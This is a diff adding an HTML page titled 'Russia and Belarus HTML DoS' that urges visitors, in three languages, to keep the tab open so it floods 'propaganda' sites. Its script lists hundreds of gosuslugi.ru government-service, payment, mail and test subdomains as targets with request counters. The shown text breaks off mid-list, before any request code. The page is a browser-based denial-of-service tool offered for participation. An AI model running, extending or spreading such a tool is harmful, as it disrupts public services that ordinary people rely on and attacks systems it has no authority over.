@@ -1,0 +1,433 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Russia and Belarus HTML DoS - gosuslugi.ru</title>
+
+</head>
+<body>
+<h1 class="title">Russia and Belarus HTML DoS</h1>
+<table>
+    <tr>
+        <td>
+        <h3>English version</h3>
+        <p class="sub">On Order - <a href="https://t.me/itarmyofukraine2022/77?comment=85145" targer="_blank">https://t.me/itarmyofukraine2022/77?comment=85145</a>
+        The credits will be added soon.
+        </p>
+        
+    </td>
+    <td>
+        <h3 class="sub">Русская версия</h3>
+        <p class="sub">"Официальные" новости в рф - это театр абсурда и мы считаем, что это нужно остановить!</p>
+        <p class="sub">Пожалуйста, просто откройте эту страницу на своём компьютере и оставтье вкладку открытой, она
+            будет
+            автоматически
+            нагружать сайты российской пропаганды.</p>
+    </td>
+    <td>
+        <h3 class="sub">Українська версія</h3>
+        <p class="sub">Офіційні новини в рф - це театр абсурду і ми вважаємо, що це треба зупинити!</p>
+        <p class="sub">Будь ласка, просто залиште відкритою цю сторінку на своєму комп'ютері щоб вона автоматично
+            навантажувала
+            сайти
+            російської пропаганди.</p>
+    </td>
+
+    </tr>
+</table>
+
+   <div id="stats"></div>
+
+<div id="errors"></div>
+</body>
+<script>
+  var targets = {
+    'https://01.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://02.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://03.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://04.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://05.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://07.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://10.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://11.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://127.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://12.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://13.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://14.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://15.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://166.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://16.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://178.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://17.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://18.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://19.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://20.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://210.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://22.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://23.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://24.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://25.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://26.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://27.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://28.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://29.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://30.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://31.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://32.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://33.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://34.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://35.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://365-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://36.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://37.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://38.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://39.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://40.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://41.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://42.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://43.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://44.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://45.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://46.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://47.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://48.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://49.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://50.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://51.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://52.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://53.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://54.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://55.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://56.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://57.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://58.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://59.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://60.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://61.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://62.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://63.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://64.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://65.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://66.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://67.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://68.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://69.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://70.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://71.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://73.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://74.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://75.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://77.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://78.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://79.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://83.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://87.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://89.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://94.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://anketa.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://api.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://api.psi02.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://api.sit01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://arm.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://asia.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://beta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://betarc.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://bot.gosweb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://census.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://crm.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://deg.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://demo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://detsad.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://dev-evoting.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://digital.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://dorogi.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://do.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ds-plugin.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://edu-stage.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://edu-uat.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ejd.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ep.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://es-bi.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://es-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://es-demo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://esia-dev.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://esia.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://esia-portal2.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://esnsi.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://e-trust2.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://e-trust.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://fc.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://feddemo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://feddemo2.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://forms-fdemo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://frgu.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ft01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://future.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate196.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate197.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate198.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate199.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate200.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate201.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate202.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate203.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate204.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gate205.mta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gateway.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gepsdemo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gosbar.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gost.regdemo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gosweb-beta.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gosweb-dev.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gov.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://guides.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://gu-st.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://helpdesk.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://im.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://info.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://infomat2.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://infomat.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://inspector.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://investdemo1.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://invest.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ip.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://i.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://knd.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://kpak.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://lk.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://lk.gslb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://lk.psi01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://lk.ssp.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mail.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mail.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mail.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://major-static.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://map.gslb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://m.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mstat.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://mx68.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.ft01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.kpak.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.nt01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.psi02.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.sit01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.sit02.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://my.ssp.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://navigator.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://new.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://nit.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ns2.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://nt01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://oewp-demo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://opros.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://partners.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://party.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pay.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://payment.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pgu2-dev.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pgu2-pub.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pgu-devsf.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pgu-fdemo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pgu-uat-fed.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://piwik-gosbar.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pixel.gslb.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://pos2.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://posobie16.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://posobie2020.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://posobie2021.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ppvftp.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ppv.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://propusk.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://psi02.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://regbusiness.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://regdemo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://regdemo-gateway.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://region.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://review.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://rfb-vote.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://rgu.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://rsa.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sc.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://search.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://search-portal1.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sgk-epgu.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sgk-esia.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sia-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://siademo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://siademo2.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sia-fdemo.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sit01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sit02.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://skuf.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://skuf-portal.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev01.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev02.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev03.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev05.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev06.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev07.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev08.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev09.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev10.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev11.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev12.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev13.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev15.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev16.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev17.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev18.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev19.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev21.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev22.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev23.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev24.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev25.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev26.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev27.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev28.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev30.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev31.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev32.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev33.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev34.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev35.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev36.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev38.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev39.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev3-n0.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev41.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev42.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev43.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev44.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev45.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev46.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev47.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev48.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev50.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev51.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev52.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev53.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev54.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev55.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev56.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev57.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev58.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev60.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev61.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev62.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev63.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev65.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev66.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev67.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev68.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev69.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev70.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev71.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev72.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev74.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev75.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev76.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev78.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev79.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev80.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev83.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev84.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev85.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev86.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev87.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev88.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev89.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev-demo1.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smev.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smtp01.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smtp68.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://smtp.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://special.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sreda.dom.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sreda.ft01.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://sreda.vtc.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://ssp.dom.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://static-dev.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://static.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://static-portal1.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://svcdev-pgu.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://svcdev-sia.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+'https://svcdev-voxel.test.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
